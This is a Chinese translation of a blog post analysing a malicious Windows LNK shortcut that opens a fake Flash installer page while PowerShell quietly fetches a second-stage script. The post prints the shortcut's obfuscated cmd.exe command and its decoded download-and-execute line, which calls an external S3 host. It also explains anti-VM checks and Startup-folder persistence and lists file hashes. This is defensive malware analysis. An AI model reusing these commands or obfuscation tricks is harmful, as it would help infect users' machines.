---
title: 看我如何分析 Windows LNK 檔案攻擊
layout: post
author: JohnThunder
source-url: https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/
tags:
- Malware
- DFIR
---

# **看我如何分析 Windows LNK 檔案攻擊**

**翻譯文章來源:** dexters-lab.net

**原文**：https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/

最近我的一個朋友分享了一個有趣的惡意樣本，它是一個微軟捷徑檔（LNK檔案），點擊（執行）後導致感染，在研究之前我並不知道2017的時候就有這樣的攻擊手法，這種類型的攻擊也有所增加，我感到很驚訝。
在這篇文章中，我們將分析 LNK 檔案惡意軟體並揭示攻擊者如何使用多層混淆來逃避 AV 並最終丟棄惡意二進制檔案，我們還將研究如何對每個層進行去解混淆，並了解代碼正在做什麼。



## **動機**

令我感興趣的原因是因為樣本本身看起來十分無辜，以及從社交工程的角度看它是多麼有說服力。作為一個捷徑，它對普通用戶來說並不可疑，因為它不是EXE。接下來，當用戶點擊時，會彈出一個瀏覽器視窗，它會打開鏈接 [https://get.adobe.com/br/flashplayer/](https://get.adobe.com/br/flashplayer/) 這會讓用戶認為他的系統中缺少一個flash插件，這就是為什麼他無法打開/執行該檔案，但一旦他安裝了 Flash 播放器，當他再次嘗試打開捷徑且意識到它只是一個垃圾檔案時，已經太晚了。

但實際發生的是它在背景中通過 shell 命令執行 Powershell 命令來下載 Powershell 腳本，該腳本執行主要惡意檔案的實際下載和安裝。它下載的檔案是一個 BMP 檔案，它看起來是一個無辜的圖像檔案，但它實際上是一個偽裝的 Powershell 檔案。



## **什麼是LNK檔案？**
LNK 是 Microsoft Windows 用於指向可執行檔案或應用程序的捷徑方式檔案的檔案副檔名。LNK 檔案通常用於創建開始菜單和桌面快捷方式。LNK代表LiNK。LNK檔案可以通過更改圖標偽裝成合法檔案，但在此案例並沒有完成。


## **基本分析**
以下是一般檔案屬性的外觀。

[![](https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/file-type.png "惡意鏈接檔案")](https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/file-type.png)

看一下_Shortcut_選項卡會給我們提供更多細節，下面是它的樣子。

[![](https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-target.png "LNK檔案定位應用程序")](https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-target.png)

正如您在 Target 欄位中看到的那樣，它指向 cmd.exe 並帶有一些參數。這是在執行此 LNK 檔案時運行的命令。但這不是整個命令。  
捷徑的 Target 欄位最大為260個字元。任何比這更長的內容都不可見。但是 command line 參數的最大長度為 4096 個字符，因此我們無法在上面的窗口中看到整個命令。我必須用另一個工具來提取整個命令。

## **深入研究 LNK 檔案格式**

使用 LNK 檔案分析工具，我們可以設法獲得整個嵌入在檔案裏面的命令，如下所示


[![](https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-cmd-report.png "Extracting command from LNK file")](https://dexters-lab.net/2019/02/16/analyzing-the-windows-lnk-file-attack-method/lnk-file-cmd-report.png)


根據上面提取出的 LNK 檔案內容我們可以找到一些有趣的欄位：
| KEY | VALUE |
| --- | --- |
| Relative path | ..\\..\\..\\..\\Windows\\system32\\cmd.exe |
| Working Directory | %SystemRoot%\\System32 |
| Arguments | /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&&… |

讓我們仔細看看 Arguments，如下所示：

    <c:\\Windows\\system32\\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&&set L1U03HmUO6B9IcurCNNlo4=.com&& echo | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/ &&set aZM4j3ZhPLBn9MpuxaO= -win 1 &&set MlyavWfE=ndows&&set jA8Axao1xcZ=iEx&&set WMkgA3uXa1pXx=tRi&&set KNhGmAqHG5=bJe&&set 4kxhaz6bqqKC=LOad&&set rwZCnSC7T=nop&&set jcCvC=NEw&&set ZTVZ=wEbc&&set DABThzRuTT2hYjVOy=nt).dow&&set cwdOsPOdA08SZaXVp1eFR=t NeT.&&set Rb=Ers&&set j4HfRAqYXcRZ3R=hEll&&set Kpl01SsXY5tthb1=.bmp&&set vh7q6Aq0zZVLclPm=\\v1.0\\&&set 2Mh=pOw&&set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%&&@echo off && %SystemDrive% && cd\ && cd %SystemRoot%\\System32 &&echo %jA8Axao1xcZ%("%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')"); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! -  >

    set x4OAGWfxlES02z6NnUkK=2whttpr0
    set L1U03HmUO6B9IcurCNNlo4=.com
    echo | start         %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/
    set aZM4j3ZhPLBn9MpuxaO= -win 1
    set MlyavWfE=ndows
    set jA8Axao1xcZ=iEx
    set WMkgA3uXa1pXx=tRi
    set KNhGmAqHG5=bJe
    set 4kxhaz6bqqKC=LOad
    set rwZCnSC7T=nop
    set jcCvC=NEw
    set ZTVZ=wEbc
    set DABThzRuTT2hYjVOy=nt).dow
    set cwdOsPOdA08SZaXVp1eFR=t NeT.
    set Rb=Ers
    set j4HfRAqYXcRZ3R=hEll
    set Kpl01SsXY5tthb1=.bmp
    set vh7q6Aq0zZVLclPm=\\v1.0\\
    set 2Mh=pOw
    set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%
    @echo off
    %SystemDrive%
    cd\\
    cd %SystemRoot%\\System32
    echo %jA8Axao1xcZ%("%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')"); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! --%ProgramFiles%\\Internet Explorer\\iexplore.exe

每一行都是shell命令。第一行是設置一些環境變數然後在第3行，最後一行使用這些環境變數來組裝這些變量並執行它們。這種組裝和反組譯變數名的方法使代碼更難閱讀。

上面混淆的 shell 腳本解碼為以下兩個命令：

1.  `C:\Windows\system32\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&&set L1U03HmUO6B9IcurCNNlo4=.com && echo | start https://get.adobe.com/br/flashplayer/` 此命令在瀏覽器打開adobe flashplayer安裝頁面。
2.  `echo iEx("iEx(New-Object Net.WebClient).DownloadString('hxxps://s3-eu-west-1.amazonaws.com/juremasobra2/jureklarj934t9oi4.bmp')"); | WindowsPowershell\v1.0\Powershell -nop -win 1 --%ProgramFiles%\\Internet Explorer\\iexplore.exe` 這個命令實際下載了第二層 Powershell ，該檔案偽裝成 URL 中的 BMP 檔案


## **解碼第二層 Powershell**

由上面的LNK檔案下載的Powershell腳本可以在此[點我](https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/jureklarj934t9oi4.ps1) fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5 上找到，它被嚴重混淆，使用[ISESteriods](http://www.powertheshell.com/obfuscationmode/)進行混淆。我確實設法解碼腳本，可以在此[點我](https://github.com/d3xt3rsl4b/analyzed-malware/blob/master/lnk_malware/decoded.ps1)上找到可讀代碼。

執行腳本執行以下操作：

1.  檢查它是否在虛擬機內部運行，如果它正在運行，則它不執行其餘命令並退出。否則，它將處理為後續步驟。該腳本檢查以下虛擬機列表：
    1.  VirtualBox的
    2.  VMware虛擬平台
    3.  虛擬機
    4.  HVM domU
2.  然後它創建一個名為 444444444444 的 Mutex，這是為了確保該電腦只運行一個這個程序。
3.  如果上一步成功，則下載一個zip，再次偽裝成一個圖像檔案，來自以下URL hxxps：//s3-eu-west-1[.]amazonaws[.]com/juremasobra2/image2.png，Hash 即887eafc19419df5119a829fd05d898503b7a0217"
4.  將PNG檔案重命名為ZIP檔案
5.  從包含DLL 92be09ca93ad6a8b04b7e2e2087fc6884fef1f63 的zip檔案中提取內容，並將此檔案複製到啟動資料夾。
6.  然後它通過在 Startup 資料夾中創建捷徑方式檔案來讓它能夠繼續存在電腦裡面，此快捷方式檔案（第二個 LNK）在命令 shell 中調用 run32.dll 來運行惡意 DLL 二進制檔案。由於 run32.dll 是一個內置的簽名二進制檔案，因此不會引起更多懷疑。例如，此命令 _rundll32.exe shell32.dll，ShellExec\_RunDLL notepad.exe_ 將啟動 notepad.exe。
7.  然後腳本會停留 40 秒，然後重新啟動機器。

通過上述攻擊，技術攻擊者試圖將其惡意DLL二進制檔案隱藏在合法二進制檔案後面。

可以在此[鏈接](https://blogs.technet.microsoft.com/motiba/2017/11/04/chasing-adversaries-with-autoruns-evading-techniques-and-countermeasures/)上找到有關這手法的更多信息


## **所有的檔案**

| SHA1 | Description |
| --- | --- |
| af6df15050dea1a756bb99bb0597d7072c2aee4c | 惡意 LNK 檔案 |
| fd60a8b790b42f0c416c28e4ad22dc317ad8fbc5 | Powershell 檔案由上述 LNK 下載 |
| 887eafc19419df5119a829fd05d898503b7a0217 | ZIP 檔案由上述 Powershell 下載 |
| 92be09ca93ad6a8b04b7e2e2087fc6884fef1f63 | 惡意 DLL 檔案由上述 ZIP 檔案解開 |

## **參考**

1.  [LNK file format](https://www.dfir.training/windows/lnk/116-windows-shortcut-file-lnk-format/file)
2.  [Other attacks similar to this](https://securitynews.sonicwall.com/xmlpost/lnk-file-is-actively-being-leveraged-to-run-file-less-powershell-script/)
3.  [TreadMicro blog no treads on this type of attacks](https://blog.trendmicro.com/trendlabs-security-intelligence/rising-trend-attackers-using-lnk-files-download-malware/)